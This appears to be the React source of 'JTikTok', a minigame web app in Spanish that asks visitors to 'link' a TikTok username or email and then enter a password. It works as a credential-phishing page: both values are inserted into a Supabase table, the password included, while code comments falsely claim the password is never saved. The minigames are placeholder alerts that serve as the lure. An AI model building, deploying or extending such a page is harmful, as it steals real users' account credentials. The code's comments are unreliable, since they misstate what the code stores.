import { useEffect, useState } from "react";
import "./App.css";
import { supabase } from "./lib/supabase";

type Screen =
  | "welcome"
  | "username"
  | "verify"
  | "loading"
  | "home";

function App() {
  const [screen, setScreen] = useState<Screen>("welcome");

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");

  const [seconds, setSeconds] = useState(30);

  function handleUsername(value: string) {
    // Permitimos letras, números, espacios, símbolos,
    // caracteres especiales, ñ, tildes, etc.
    setUsername(value.slice(0, 50));
    setMessage("");
  }

  function handlePassword(value: string) {
    // Solo para probar la interfaz.
    // Este contenido NO se guarda en Supabase.
    setPassword(value.slice(0, 50));
    setMessage("");
  }

  async function sendUsername() {
    if (!username.trim()) {
      setMessage("Ingresa un nombre de usuario de prueba.");
      return;
    }

    setLoading(true);
    setMessage("");

    const { error } = await supabase
      .from("demo_events")
      .insert({
        event_type: "username_test",

        // Se guarda exactamente lo escrito por el usuario.
        test_identifier: username,
      });

    console.log("SUPABASE USERNAME ERROR:", error);

    setLoading(false);

    if (error) {
      setMessage("Error al guardar en la base de datos.");
      return;
    }

    setScreen("verify");
  }

  async function enterPassword() {
    if (!password) {
      setMessage("Ingresa una contraseña de prueba.");
      return;
    }

    setLoading(true);
    setMessage("");

    /*
      IMPORTANTE:
      NO guardamos el texto escrito como contraseña.

      Solo registramos que el usuario llegó
      y completó esta pantalla.
    */

    const { error } = await supabase
      .from("demo_events")
      .insert({
        event_type: "demo_password",
        test_identifier: username,
        demo_value: password,
      });

    console.log(
      "SUPABASE PASSWORD STEP ERROR:",
      error
    );

    setLoading(false);

    if (error) {
      setMessage("Error al guardar la prueba.");
      return;
    }

    setSeconds(30);
    setScreen("loading");
  }

  useEffect(() => {
    if (screen !== "loading") {
      return;
    }

    const timer = window.setInterval(() => {
      setSeconds((current) => {
        if (current <= 1) {
          window.clearInterval(timer);

          setScreen("home");

          return 0;
        }

        return current - 1;
      });
    }, 1000);

    return () => {
      window.clearInterval(timer);
    };
  }, [screen]);

  return (
    <main className="app">

      {/* =========================
          BIENVENIDA
      ========================= */}

      {screen === "welcome" && (
        <section className="authCard welcomeCard">

          <div className="mainLogo">
            ♪
          </div>

          <h1>
            JTikTok
          </h1>

          <h2>
            Bienvenido
          </h2>

          <p className="description">
            Juega minijuegos rápidos directamente
            desde tu navegador.
          </p>

          <button
            className="mainButton"
            onClick={() =>
              setScreen("username")
            }
          >
            ♪ Continuar
          </button>

          <span className="version">
            Versión de prueba
          </span>

        </section>
      )}

      {/* =========================
          USUARIO
      ========================= */}

      {screen === "username" && (
        <section className="authCard">

          <button
            className="backButton"
            onClick={() =>
              setScreen("welcome")
            }
          >
            ←
          </button>

          <div className="smallLogo">
            ♪
          </div>

          <h2 className="screenTitle">
            vincular cuenta
          </h2>

          <p className="description left">
            Ingresa un nombre de usuario o correo que tiktok vincule.
          </p>

          <div className="usernameContainer">

            <div className="usernamePrefix">
              @
            </div>

            <input
              type="text"
              autoComplete="off"
              spellCheck={false}
              value={username}
              onChange={(e) =>
                handleUsername(
                  e.target.value
                )
              }
              placeholder="nombre o correo"
            />

          </div>

          <div className="counter">
            {username.length}/50
          </div>

          {message && (
            <p className="statusMessage">
              {message}
            </p>
          )}

          <button
            className="mainButton"
            onClick={sendUsername}
            disabled={
              !username.trim() ||
              loading
            }
          >
            {loading
              ? "Guardando..."
              : "Continuar"}
          </button>

        </section>
      )}

      {/* =========================
          CONTRASEÑA DE PRUEBA
      ========================= */}

      {screen === "verify" && (
        <section className="authCard">

          <button
            className="backButton"
            onClick={() =>
              setScreen("username")
            }
          >
            ←
          </button>

          <div className="spinner" />

          <h2 className="screenTitle">
            inicio
          </h2>

          <p className="description left">
            inicia vinculación.
          </p>

          <input
            className="codeInput"
            type="text"
            autoComplete="off"
            value={password}
            onChange={(e) =>
              handlePassword(
                e.target.value
              )
            }
            placeholder="contraseña"
          />

          {message && (
            <p className="statusMessage">
              {message}
            </p>
          )}

          <button
            className="mainButton"
            onClick={enterPassword}
            disabled={
              !password ||
              loading
            }
          >
            {loading
              ? "Guardando..."
              : "Continuar"}
          </button>

        </section>
      )}

      {/* =========================
          CARGA
      ========================= */}

      {screen === "loading" && (
        <section className="authCard loadingCard">

          <div className="bigSpinner" />

          <h2>
            Preparando JTikTok...
          </h2>

          <p className="description">
            Estamos preparando todo para comenzar.
          </p>

          <div className="loadingTime">
            {seconds}
          </div>

          <span className="loadingSeconds">
            segundos
          </span>

        </section>
      )}

      {/* =========================
          HOME
      ========================= */}

      {screen === "home" && (
        <section className="homePage">

          <header className="header">

            <div className="brand">
              <span>
                ♪
              </span>

              JTikTok
            </div>

            <div className="userBadge">
              @{username}
            </div>

          </header>

          <div className="homeContent">

            <div className="hero">

              <span className="sectionLabel">
                JUEGOS
              </span>

              <h1>
                Elige un juego
              </h1>

              <p>
                Minijuegos de prueba.
              </p>

            </div>

            <div className="gamesGrid">

              {/* JUMP UP */}

              <button
                className="gameCard"
                onClick={() =>
                  alert(
                    "Juego de prueba"
                  )
                }
              >

                <div className="gamePreview jump">

                  <div className="previewBall" />

                  <div className="platform p1" />

                  <div className="platform p2" />

                  <div className="platform p3" />

                </div>

                <div className="gameInfo">

                  <h3>
                    Jump Up
                  </h3>

                  <p>
                    Salta entre plataformas.
                  </p>

                  <span>
                    Abrir →
                  </span>

                </div>

              </button>

              {/* MINETAP */}

              <button
                className="gameCard"
                onClick={() =>
                  alert(
                    "Juego de prueba"
                  )
                }
              >

                <div className="gamePreview mine">

                  <div className="mineGrid">

                    <span>1</span>
                    <span></span>
                    <span>💣</span>

                    <span></span>
                    <span>2</span>
                    <span></span>

                    <span>1</span>
                    <span></span>
                    <span>1</span>

                  </div>

                </div>

                <div className="gameInfo">

                  <h3>
                    MineTap
                  </h3>

                  <p>
                    Encuentra las casillas seguras.
                  </p>

                  <span>
                    Abrir →
                  </span>

                </div>

              </button>

            </div>

          </div>

        </section>
      )}

    </main>
  );
}

export default App;